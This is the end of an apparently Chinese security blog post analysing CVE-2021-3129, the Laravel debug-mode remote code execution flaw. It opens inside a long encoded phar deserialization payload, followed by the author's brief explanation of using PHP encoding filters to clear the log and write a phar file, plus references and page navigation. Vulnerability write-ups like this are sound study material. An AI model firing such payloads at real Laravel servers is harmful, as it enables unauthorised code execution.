D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;31&#x3D;00&#x3D;70&#x3D;00&#x3D;64&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;74&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;77&#x3D;00&#x3D;63&#x3D;00&#x3D;6D&#x3D;00&#x3D;39&#x3D;00&#x3D;6A&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;62&#x3D;00&#x3D;33&#x3D;00&#x3D;4A&#x3D;00&#x3D;7A&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;68&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;44&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;63&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;4E&#x3D;00&#x3D;31&#x3D;00&#x3D;63&#x3D;00&#x3D;6E&#x3D;00&#x3D;4A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;6E&#x3D;00&#x3D;51&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;6A&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;78&#x3D;00&#x3D;73&#x3D;00&#x3D;58&#x3D;00&#x3D;33&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;66&#x3D;00&#x3D;5A&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;59&#x3D;00&#x3D;79&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;42&#x3D;00&#x3D;51&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;52&#x3D;00&#x3D;31&#x3D;00&#x3D;62&#x3D;00&#x3D;57&#x3D;00&#x3D;31&#x3D;00&#x3D;35&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;4A&#x3D;00&#x3D;6B&#x3D;00&#x3D;70&#x3D;00&#x3D;46&#x3D;00&#x3D;57&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;48&#x3D;00&#x3D;35&#x3D;00&#x3D;2F&#x3D;00&#x3D;32&#x3D;00&#x3D;4B&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;48&#x3D;00&#x3D;52&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;51&#x3D;00&#x3D;75&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;68&#x3D;00&#x3D;30&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;4A&#x3D;00&#x3D;6B&#x3D;00&#x3D;70&#x3D;00&#x3D;46&#x3D;00&#x3D;57&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;48&#x3D;00&#x3D;35&#x3D;00&#x3D;2F&#x3D;00&#x3D;32&#x3D;00&#x3D;4B&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;52&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;52&#x3D;00&#x3D;49&#x3D;00&#x3D;52&#x3D;00&#x3D;63&#x3D;00&#x3D;6B&#x3D;00&#x3D;38&#x3D;00&#x3D;61&#x3D;00&#x3D;56&#x3D;00&#x3D;41&#x3D;00&#x3D;6C&#x3D;00&#x3D;57&#x3D;00&#x3D;6C&#x3D;00&#x3D;68&#x3D;00&#x3D;57&#x3D;00&#x3D;4E&#x3D;00&#x3D;78&#x3D;00&#x3D;42&#x3D;00&#x3D;7A&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;67&#x3D;00&#x3D;62&#x3D;00&#x3D;5A&#x3D;00&#x3D;67&#x3D;00&#x3D;58&#x3D;00&#x3D;51&#x3D;00&#x3D;31&#x3D;00&#x3D;51&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;48&#x3D;00&#x3D;51&#x3D;00&#x3D;6B&#x3D;00&#x3D;31&#x3D;00&#x3D;43&#x3D;00</span><br></pre></td></tr></table></figure>






<h1 id="一点自己的想法"><a href="#一点自己的想法" class="headerlink" title="一点自己的想法"></a>一点自己的想法</h1><p>这里主要是利用php的编码转换，来情况Log文件，最后写phar文件，这里的编码是真坑</p>
<p>参考链接</p>
<p><a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.convert.php">https://www.php.net/manual/zh/filters.convert.php<i class="fas fa-external-link-alt"></i></a></p>

        </div>

        
            <div class="post-copyright-info">
                <div class="article-copyright-info-container">
    <ul>
        <li>Post title：CVE-2021-3129(Laravel.Debug.RCE)</li>
        <li>Post author：p1k</li>
        <li>Create time：2021-01-30 11:18:25</li>
        <li>
            Post link：http://p1keman.github.io/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/
        </li>
        <li>
            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
        </li>
    </ul>
</div>

            </div>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2021/02/01/Java-RMI/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Java_RMI</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2021/01/29/CORS/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">CORS</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span> -
            
            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">p1k</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.3.1</a>
        </div>
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="nav-text">环境安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%8D%E7%82%B9"><span class="nav-text">重点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#utf8-gt-utf16"><span class="nav-text">utf8-&gt;utf16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#quoted-printable"><span class="nav-text">quoted-printable</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#utf16be-gt-utf8"><span class="nav-text">utf16be-&gt;utf8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base64"><span class="nav-text">base64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%85%A5phar"><span class="nav-text">写入phar</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%88%E7%9C%8B%E4%B8%AAdemo"><span class="nav-text">先看个demo</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%A5%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-%E6%AF%8F%E4%B8%80%E6%AD%A5%E5%8E%9F%E7%90%86"><span class="nav-text">来分析一下 每一步原理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%90%91%E7%94%9F%E6%88%90%E7%9C%9F%E6%AD%A3%E7%9A%84payload"><span class="nav-text">反向生成真正的payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E7%82%B9%E8%87%AA%E5%B7%B1%E7%9A%84%E6%83%B3%E6%B3%95"><span class="nav-text">一点自己的想法</span></a></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>





    
<script src="/js/code-copy.js"></script>





<div class="post-scripts">
    
        
<script src="/js/left-side-toggle.js"></script>

<script src="/js/libs/anime.min.js"></script>

<script src="/js/toc.js"></script>

    
</div>



</body>
</html>
